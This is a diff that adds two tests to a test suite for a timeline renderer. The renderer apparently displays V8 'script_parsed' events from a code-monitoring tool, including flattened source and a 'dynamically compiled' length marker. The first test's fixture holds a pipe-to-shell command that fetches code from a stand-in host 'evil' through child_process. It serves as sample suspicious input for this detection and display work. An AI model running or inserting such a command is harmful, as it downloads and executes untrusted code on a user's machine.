@@ -170,6 +170,29 @@ describe("renderTimeline — merged order + ids", () => {
     expect(text).not.toContain("[x");
   });
 
+  it("renders a script_parsed event as decoded source + a dynamically-compiled marker", () => {
+    const source = "require('child_process')\n  .exec('curl evil | sh')";
+    const { text } = renderTimeline(
+      artifact([
+        ev({ stream: "L4:v8inspector", kind: "script_parsed", timestamp: 0, normalized: { url: "evalmachine.<anonymous>", source, len: source.length } }),
+      ]),
+    );
+    const line = lineFor(text, "e1");
+    expect(line).toContain("require('child_process') .exec('curl evil | sh')"); // flattened source, not the url
+    expect(line).not.toContain("evalmachine"); // the meaningless url is not shown
+    expect(line).toContain(`[dynamically compiled · ${source.length}c]`); // explicit invariant + true length, not capped
+    expect(text).toContain("── [L4] node calls"); // lands in the L4 block, no wall-clock
+  });
+
+  it("marks a script whose captured source was capped (a large decoded blob is itself notable)", () => {
+    const { text } = renderTimeline(
+      artifact([
+        ev({ stream: "L4:v8inspector", kind: "script_parsed", timestamp: 0, normalized: { url: "", source: "x".repeat(8192), len: 45210 } }),
+      ]),
+    );
+    expect(lineFor(text, "e1")).toContain("[dynamically compiled · 45210c · capped]");
+  });
+
   it("renders a header with trigger + setup and an empty-events fallback", () => {
     const { text } = renderTimeline(
       artifact([], {
